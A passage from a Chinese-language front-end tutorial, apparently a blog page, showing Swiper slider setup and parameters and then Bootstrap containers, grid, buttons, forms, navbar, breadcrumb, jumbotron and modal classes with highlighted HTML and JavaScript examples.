class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"js/swiper.min.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line">  如果页面引用了jquery或者zepto，就引用 swiper.jquery.min.js,它的容量比swiper.min.js</span><br><span class="line"></span><br><span class="line">  &lt;script src=<span class="string">"path/to/swiper.jquery.min.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">&lt;link rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> href=<span class="string">"css/swiper.min.css"</span>&gt;</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"swiper-container"</span>&gt;</span><br><span class="line">  &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"swiper-wrapper"</span>&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"swiper-slide"</span>&gt;slider1&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    &lt;div class="swiper-slide"&gt;slider2&lt;/</span>div&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"swiper-slide"</span>&gt;slider3&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>div&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"swiper-pagination"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"swiper-button-prev"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"swiper-button-next"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;script&gt; </span></span><br><span class="line"><span class="regexp">var swiper = new Swiper('.swiper-container', &#123;</span></span><br><span class="line"><span class="regexp">    pagination: '.swiper-pagination',</span></span><br><span class="line"><span class="regexp">  prevButton: '.swiper-button-prev',</span></span><br><span class="line"><span class="regexp">  nextButton: '.swiper-button-next',</span></span><br><span class="line"><span class="regexp">    initialSlide :1,</span></span><br><span class="line"><span class="regexp">  paginationClickable: true,</span></span><br><span class="line"><span class="regexp">  loop: true,</span></span><br><span class="line"><span class="regexp">  autoplay:3000,</span></span><br><span class="line"><span class="regexp">  autoplayDisableOnInteraction:false</span></span><br><span class="line"><span class="regexp">&#125;);</span></span><br><span class="line"><span class="regexp">&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure><h3 id="11-13-2-swiper使用参数："><a href="#11-13-2-swiper使用参数：" class="headerlink" title="11.13.2 swiper使用参数："></a>11.13.2 swiper使用参数：</h3><p>1、initialSlide：初始索引值，从0开始<br>2、direction：滑动方向 horizontal | vertical<br>3、speed：滑动速度，单位ms<br>4、autoplay：设置自动播放及播放时间<br>5、autoplayDisableOnInteraction：用户操作swipe后是否还自动播放，默认是true，不再自动播放<br>6、pagination：分页圆点<br>7、paginationClickable：分页圆点是否点击<br>8、prevButton：上一页箭头<br>9、nextButton：下一页箭头<br>10、loop：是否首尾衔接 </p><h2 id="11-4-bootstrap"><a href="#11-4-bootstrap" class="headerlink" title="11.4 bootstrap"></a>11.4 bootstrap</h2><p>简单、直观、强悍的前端开发框架，让web开发更迅速、简单。 来自Twitter，是目前很受欢迎的前端框架之一。 Bootrstrap是基于HTML、CSS、JavaScript的，让书写代码更容易。 移动优先，响应式布局开发。</p><p>bootstrap中文网址：<a href="http://www.bootcss.com/">http://www.bootcss.com/</a></p><h3 id="11-4-1-bootstrap-容器"><a href="#11-4-1-bootstrap-容器" class="headerlink" title="11.4.1 bootstrap 容器"></a>11.4.1 bootstrap 容器</h3><ul><li>container-fluid 流体</li><li>container <ul><li>1170</li><li>970</li><li>750</li><li>100%</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;container-fluid&quot;&gt;流体容器&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;container&quot;&gt;响应式固定容器&lt;/div&gt;</span><br></pre></td></tr></table></figure><h3 id="11-4-2-bootstrap响应式查询区间"><a href="#11-4-2-bootstrap响应式查询区间" class="headerlink" title="11.4.2 bootstrap响应式查询区间"></a>11.4.2 bootstrap响应式查询区间</h3><p>1、大于等于768<br>2、大于等于992<br>3、大于等于1200</p><h3 id="11-4-3-bootstrap-栅格系统"><a href="#11-4-3-bootstrap-栅格系统" class="headerlink" title="11.4.3 bootstrap 栅格系统"></a>11.4.3 bootstrap 栅格系统</h3><p>bootstrap将页面横向分为12等分，按照12等分定义了适应不同宽度等分的样式类，这些样式类组成了一套响应式、移动设备优先的流式栅格系统：</p><p>1、col-lg-  <em>大于1200排成一行，小于1200分别占一行2、col-md-</em>  大于992排成一行，小于992分别占一行<br>3、col-sm-  <em>大于768排成一行，小于768分别占一行4、col-xs-</em>  始终排列成一行  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;style type=<span class="string">"text/css"</span>&gt;</span><br><span class="line">    div[<span class="class"><span class="keyword">class</span>*</span>=<span class="string">'col-'</span>]&#123;</span><br><span class="line"></span><br><span class="line">        background-color:cyan;</span><br><span class="line">        border:1px solid #ddd;</span><br><span class="line">        height:<span class="number">50</span>px;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;<span class="regexp">/style&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">......</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;div class="container"&gt;</span></span><br><span class="line"><span class="regexp">    &lt;div class="row"&gt;</span></span><br><span class="line"><span class="regexp">        &lt;div class="col-lg-3"&gt;col-lg-3&lt;/</span>div&gt;</span><br><span class="line">        &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-lg-3"</span>&gt;col-lg<span class="number">-3</span>&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;div class="col-lg-5"&gt;col-lg-5&lt;/</span>div&gt;</span><br><span class="line">        &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-lg-1"</span>&gt;col-lg<span class="number">-1</span>&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>div&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"row"</span>&gt;</span><br><span class="line">        &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-md-3"</span>&gt;col-md<span class="number">-3</span>&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;div class="col-md-3"&gt;col-md-3&lt;/</span>div&gt;</span><br><span class="line">        &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-md-3"</span>&gt;col-md<span class="number">-3</span>&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;div class="col-md-3"&gt;col-md-3&lt;/</span>div&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    &lt;br&gt;</span></span><br><span class="line"><span class="regexp">    &lt;br&gt;</span></span><br><span class="line"><span class="regexp">    &lt;div class="row"&gt;</span></span><br><span class="line"><span class="regexp">        &lt;div class="col-sm-3"&gt;col-sm-3&lt;/</span>div&gt;</span><br><span class="line">        &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-sm-3"</span>&gt;col-sm<span class="number">-3</span>&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;div class="col-sm-3"&gt;col-sm-3&lt;/</span>div&gt;</span><br><span class="line">        &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-sm-3"</span>&gt;col-sm<span class="number">-3</span>&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>div&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"row"</span>&gt;</span><br><span class="line">        &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-xs-3"</span>&gt;col-xs<span class="number">-3</span>&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;div class="col-xs-3"&gt;col-xs-3&lt;/</span>div&gt;</span><br><span class="line">        &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"col-xs-3"</span>&gt;col-xs<span class="number">-3</span>&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;div class="col-xs-3"&gt;col-xs-3&lt;/</span>div&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>div&gt;</span><br></pre></td></tr></table></figure><h3 id="11-4-4-列偏移"><a href="#11-4-4-列偏移" class="headerlink" title="11.4.4 列偏移"></a>11.4.4 列偏移</h3><p>1、col-lg-offset-<em>2、col-md-offset-</em><br>3、col-sm-offset-<em>4、col-xs-offset-</em>  </p><h3 id="11-4-5-bootstrap-按钮"><a href="#11-4-5-bootstrap-按钮" class="headerlink" title="11.4.5 bootstrap 按钮"></a>11.4.5 bootstrap 按钮</h3><p>1、btn  声明按钮<br>2、btn-default 默认按钮样式<br>3、btn-primay<br>4、btn-success<br>5、btn-info<br>6、btn-warning<br>7、btn-danger<br>8、btn-link<br>9、btn-lg<br>10、btn-md<br>11、btn-xs<br>12、btn-block  宽度是父级宽100%的按钮<br>13、active<br>14、disabled<br>15、btn-group  定义按钮组 </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 一般按钮组 --&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"btn-group"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"button"</span> name=<span class="string">""</span> value=<span class="string">"按钮一"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"btn btn-primary"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"button"</span> name=<span class="string">""</span> value=<span class="string">"按钮二"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"btn btn-warning"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"button"</span> name=<span class="string">""</span> value=<span class="string">"按钮三"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"btn btn-danger"</span>&gt;</span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;!-- 通栏按钮组 </span></span><br><span class="line"><span class="regexp">     如果用input标签做按钮，需要将它用 btn-group的容器包起来</span></span><br><span class="line"><span class="regexp">--&gt;</span></span><br><span class="line"><span class="regexp">&lt;div class="btn-group btn-group-justified"&gt;</span></span><br><span class="line"><span class="regexp">    &lt;div class="btn-group"&gt;</span></span><br><span class="line"><span class="regexp">        &lt;input type="button" name="" value="按钮一" class="btn btn-primary"&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>div&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"btn-group"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"button"</span> name=<span class="string">""</span> value=<span class="string">"按钮二"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"btn btn-warning"</span>&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    &lt;div class="btn-group"&gt;</span></span><br><span class="line"><span class="regexp">        &lt;input type="button" name="" value="按钮三" class="btn btn-danger"&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>div&gt;</span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;!-- 通栏按钮组，如果用a标签做按钮，就不用上面的结构，直接写</span></span><br><span class="line"><span class="regexp">--&gt;</span></span><br><span class="line"><span class="regexp">&lt;div class="btn-group btn-group-justified"&gt;</span></span><br><span class="line"><span class="regexp">    &lt;a href="#" class="btn btn-primary"&gt;按钮一&lt;/</span>a&gt;</span><br><span class="line">    &lt;a href=<span class="string">"#"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"btn btn-default"</span>&gt;按钮二&lt;<span class="regexp">/a&gt;</span></span><br><span class="line"><span class="regexp">    &lt;a href="#" class="btn btn-default"&gt;按钮三&lt;/</span>a&gt;</span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br></pre></td></tr></table></figure><h3 id="11-4-6-bootstrap-表单"><a href="#11-4-6-bootstrap-表单" class="headerlink" title="11.4.6 bootstrap 表单"></a>11.4.6 bootstrap 表单</h3><p>1、form 声明一个表单域<br>2、form-inline 内联表单域<br>3、form-horizontal 水平排列表单域<br>4、form-group 表单组、包括表单文字和表单控件<br>5、form-control 文本输入框、下拉列表控件样式<br>6、checkbox checkbox-inline 多选框样式<br>7、radio radio-inline 单选框样式<br>8、input-group 表单控件组<br>9、input-group-addon 表单控件组物件样式<br>10、input-group-btn 表单控件组物件为按钮的样式<br>11、form-group-lg  大尺寸表单<br>12、form-group-sm  小尺寸表单</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--  表单  --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">role</span>=<span class="string">"form"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group form-group-lg"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"exampleInputEmail1"</span>&gt;</span>Email address<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"email"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">id</span>=<span class="string">"exampleInputEmail1"</span> <span class="attr">placeholder</span>=<span class="string">"Enter email"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"exampleInputPassword1"</span>&gt;</span>Password<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">id</span>=<span class="string">"exampleInputPassword1"</span> <span class="attr">placeholder</span>=<span class="string">"Password"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"exampleInputFile"</span>&gt;</span>File input<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">id</span>=<span class="string">"exampleInputFile"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"help-block"</span>&gt;</span>Example block-level help text here.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"checkbox"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span>&gt;</span> Check me out</span><br><span class="line">    <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span>&gt;</span>Submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--  表单控件组  --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"input-group"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"input-group-addon"</span>&gt;</span>@<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--  表单控件组  --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"input-group"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"input-group-btn"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span> <span class="attr">type</span>=<span class="string">"button"</span>&gt;</span>Go!<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="11-4-7-bootstrap-图片"><a href="#11-4-7-bootstrap-图片" class="headerlink" title="11.4.7 bootstrap 图片"></a>11.4.7 bootstrap 图片</h3><p>img-responsive  声明响应式图片</p><h3 id="11-4-8-bootstrap-字体图标"><a href="#11-4-8-bootstrap-字体图标" class="headerlink" title="11.4.8 bootstrap 字体图标"></a>11.4.8 bootstrap 字体图标</h3><p>通过字体代替图标，font文件夹需要和css文件夹在同一目录 </p><h3 id="11-4-9-bootstrap-导航条"><a href="#11-4-9-bootstrap-导航条" class="headerlink" title="11.4.9 bootstrap 导航条"></a>11.4.9 bootstrap 导航条</h3><p>1、navbar  声明导航条<br>2、navbar-default  声明默认的导航条样式<br>3、navbar-inverse  声明反白的导航条样式<br>4、navbar-static-top  去掉导航条的圆角<br>5、navbar-fixed-top  固定到顶部的导航条<br>6、navbar-fixed-bottom  固定到底部的导航条<br>7、navbar-header  申明logo的容器<br>8、navbar-brand  针对logo等固定内容的样式<br>11、nav navbar-nav 定义导航条中的菜单<br>12、navbar-form 定义导航条中的表单<br>13、navbar-btn 定义导航条中的按钮<br>14、navbar-text 定义导航条中的文本<br>15、navbar-left  菜单靠左<br>16、navbar-right  菜单靠右</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 可伸缩菜单 data-target="#.." 需要加#  --&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"navbar navbar-inverse navbar-static-top "</span>&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"container"</span>&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"navbar-header"</span>&gt;</span><br><span class="line">        &lt;button <span class="class"><span class="keyword">class</span></span>=<span class="string">"navbar-toggle"</span> data-toggle=<span class="string">"collapse"</span> data-target=<span class="string">"#mymenu"</span>&gt;</span><br><span class="line">            &lt;span <span class="class"><span class="keyword">class</span></span>=<span class="string">"icon-bar"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line">            &lt;span <span class="class"><span class="keyword">class</span></span>=<span class="string">"icon-bar"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line">            &lt;span <span class="class"><span class="keyword">class</span></span>=<span class="string">"icon-bar"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line">         &lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">         &lt;a href="#" class="navbar-brand"&gt;LOGO&lt;/</span>a&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    &lt;div class="collapse navbar-collapse" id="mymenu"&gt;</span></span><br><span class="line"><span class="regexp">        &lt;ul class="nav navbar-nav"&gt;</span></span><br><span class="line"><span class="regexp">            &lt;li class="active"&gt;&lt;a href="#"&gt;首页&lt;/</span>a&gt;<span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">            &lt;li&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>公司新闻<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">            &lt;li&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>行业动态<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">        &lt;<span class="regexp">/ul&gt;</span></span><br><span class="line"><span class="regexp">        &lt;form class="navbar-form navbar-right"&gt;</span></span><br><span class="line"><span class="regexp">            &lt;div class="form-group"&gt;</span></span><br><span class="line"><span class="regexp">                &lt;div class="input-group"&gt;</span></span><br><span class="line"><span class="regexp">                  &lt;input type="text" class="form-control"&gt;</span></span><br><span class="line"><span class="regexp">                  &lt;span class="input-group-btn"&gt;</span></span><br><span class="line"><span class="regexp">                    &lt;button class="btn btn-default" type="button"&gt;Go!&lt;/</span>button&gt;</span><br><span class="line">                  &lt;<span class="regexp">/span&gt;</span></span><br><span class="line"><span class="regexp">                &lt;/</span>div&gt;    </span><br><span class="line">            &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;/</span>form&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>div&gt;</span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br></pre></td></tr></table></figure><h3 id="11-4-10-路径导航"><a href="#11-4-10-路径导航" class="headerlink" title="11.4.10 路径导航"></a>11.4.10 路径导航</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;ol <span class="class"><span class="keyword">class</span></span>=<span class="string">"breadcrumb"</span>&gt;</span><br><span class="line">  &lt;li&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">  &lt;li&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>Library<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">  &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"active"</span>&gt;Data&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>ol&gt;</span><br></pre></td></tr></table></figure><h3 id="11-4-11-巨幕"><a href="#11-4-11-巨幕" class="headerlink" title="11.4.11 巨幕"></a>11.4.11 巨幕</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"jumbotron"</span>&gt;</span><br><span class="line">  &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"container"</span>&gt;</span><br><span class="line">    ...</span><br><span class="line">  &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>div&gt;</span><br></pre></td></tr></table></figure><h3 id="11-4-12-bootstrap-模态框"><a href="#11-4-12-bootstrap-模态框" class="headerlink" title="11.4.12 bootstrap 模态框"></a>11.4.12 bootstrap 模态框</h3><p>1、modal  声明一个模态框<br>2、modal-dialog  定义模态框尺寸<br>3、modal-lg  定义大尺寸模态框<br>4、modal-sm  定义小尺寸模态框<br>5、modal-header<br>6、modal-body<br>7、modal-footer </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 